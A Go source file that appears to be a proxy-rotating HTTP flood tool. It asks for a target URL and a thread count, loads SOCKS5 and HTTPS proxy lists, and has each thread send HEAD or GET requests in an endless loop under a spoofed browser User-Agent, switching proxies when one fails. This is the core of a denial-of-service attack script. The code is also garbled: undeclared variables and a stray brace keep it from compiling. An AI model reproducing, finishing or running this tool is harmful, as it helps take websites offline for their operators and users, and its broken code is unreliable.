package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

func main() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter HTTP method (HEAD or GET): ")
	method, _ := reader.ReadString('\n')
	method = strings.ToUpper(strings.TrimSpace(method))

	fmt.Print("Enter URL: ")
	requestUrl, _ := reader.ReadString('\n')
	requestUrl = strings.TrimSpace(requestUrl)

	fmt.Print("Enter number of threads: ")
	threadBytes, _, _ := reader.ReadLine()
	numThreads, _ := strconv.Atoi(strings.TrimSpace(string(threadBytes)))

	// Read SOCKS5 proxies from file
	socks5Bytes, _ := ioutil.ReadFile("socks5.txt")
	socks5Proxies := strings.Split(strings.TrimSpace(string(socks5Bytes)), "\n")
	if len(socks5Proxies) == 1 && socks5Proxies[0] == "" {
		socks5Proxies = []string{}
	}

	// Read HTTPS proxies from file
	httpsBytes, _ := ioutil.ReadFile("https.txt")
	httpsProxies := strings.Split(strings.TrimSpace(string(httpsBytes)), "\n")
	if len(httpsProxies) == 1 && httpsProxies[0] == "" {
		httpsProxies = []string{}
	}

	// Combine both lists of proxies
	proxies := append(socks5Proxies, httpsProxies...)

	var wg sync.WaitGroup
	wg.Add(numThreads)

	proxyUsage := make([]int, len(proxies))

	for i := 0; i < numThreads; i++ {
		go func(i int) {
			defer wg.Done()

			for {
				proxyIndex := i % len(proxies)
				proxyStr := proxies[proxyIndex]

				dialFunc = func(network, addr string) (net.Conn, error) {
    httpProxy := http.ProxyURL(proxyUrl)
    proxy, _ := httpProxy(&http.Request{})
    return proxy.Dial(network, addr)
}


				}

				httpTransport := &http.Transport{Dial: dialFunc}
				client := &http.Client{Transport: httpTransport}

				req, _ := http.NewRequest(method, requestUrl, nil)
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537")

				_, err := client.Do(req)
				if err != nil {
					fmt.Printf("Proxy %s disconnected, error: %s\n", proxyStr, err)
					// Try to reconnect to the same proxy
					time.Sleep(2 * time.Second)
					_, err := client.Do(req)
					if err != nil {
						fmt.Printf("Reconnection to proxy %s failed, error: %s\n", proxyStr, err)
						// Change to a different proxy
						minUsage := proxyUsage[0]
						minIndex := 0
						for i, usage := range proxyUsage {
							if usage < minUsage {
								minUsage = usage
								minIndex = i
							}
						}
						proxyIndex = minIndex
						proxyStr = proxies[proxyIndex]
						fmt.Printf("Switching to a new proxy: %s\n", proxyStr)
					}
				}
				proxyUsage[proxyIndex]++
			}
		}(i)
	}

	wg.Wait()
}
